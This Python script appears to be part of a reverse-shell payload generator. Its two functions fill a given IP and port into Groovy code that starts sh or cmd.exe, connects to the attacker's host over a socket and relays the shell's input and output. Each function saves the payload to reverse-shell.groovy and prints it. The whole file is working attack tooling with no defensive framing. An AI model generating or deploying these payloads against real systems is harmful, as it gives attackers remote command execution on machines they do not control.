from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def GrovvyShell(ip, port):
    payload = """String host="%s";int port=%d;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();""" % (ip, port)
    with open("reverse-shell.groovy", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="noise"):
      time.sleep(3)
      f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"groovy",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.groovy\n[/#aed06d]", style=myStyle)

def GroovyShell2(ip, port):
    payload = """String host="%s";
int port=%d;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();""" % (ip, port)
    with open("reverse-shell.groovy", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="noise"):
      time.sleep(3)
      f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"groovy",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.groovy\n[/#aed06d]", style=myStyle)